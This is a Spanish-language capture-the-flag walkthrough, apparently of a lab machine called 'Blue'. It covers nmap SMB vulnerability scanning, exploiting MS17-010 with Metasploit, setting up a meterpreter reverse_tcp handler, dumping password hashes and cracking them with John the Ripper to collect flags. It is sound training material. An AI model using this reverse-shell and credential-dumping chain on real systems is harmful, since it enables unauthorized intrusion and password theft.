# BLUE
## Escaneo de puertos

```bash
nmap -sV -O ip
```

-sV: Nos da la la versión de los servicios
-O: Te dice el sistema operativo

![image](1.png)

Para conseguir a que es vulnerable ejecutamos el comando

```bash
nmap --script smb-vuln* ip
```

--script: lo que hace es buscar todos los script que pueden afectar

![image](2.png)

## Entramos en Metasploit 

Hacemos `msfconsole` para entrar en Metasploit y buscamos la vulnerabilidad `MS17-010` 

![image](3.png)

Ajustamos los parametros de RHOSTS y LHOST para poder utilizarlo correctamente

![image](4.png)

Hacemos run y entramos en el ordenador

![image](5.png)

Convertimos la shell en un meterpreter con los siguientes comandos

```bash
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp 
set payload for your target set LHOST ip_del_tunel
```



## Cracking

Para ello ponemos `hashdump` y nos devuelve los usuarios con las contraseñas hasheadas

![image](6.png)


Para ver la contraseña en plano ponemos el siguiente comando con `John the Ripper`

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt contraseña
```

![image](7.png)

## Encontrar flags

Hacemos `cd C:\\` , después hacemos `ls` y vemos que hay un archivo que se llama `flag1.txt` y entramos en el archivo haciento `cat flag1.txt` y obtenemos la primera flag `flag{access_the_machine}`

![image](8.png)

Esto es lo que contiene flag1.txt

![image](9.png)



Para la segunda flag nos vamos a `C:\\Windows\System32\config` y hacemos `ls` para ver la flag2


![image](10.png)


Esto es lo que contiene flag2.txt

![image](11.png)

Para la ultima flag vamos a `C:\\User\Jon\Documents` y hacemos `ls` y encontramos un archivo que se llama flag3.txt

![image](12.png)

Esto es lo que contiene flag3.txt

![image](13.png)


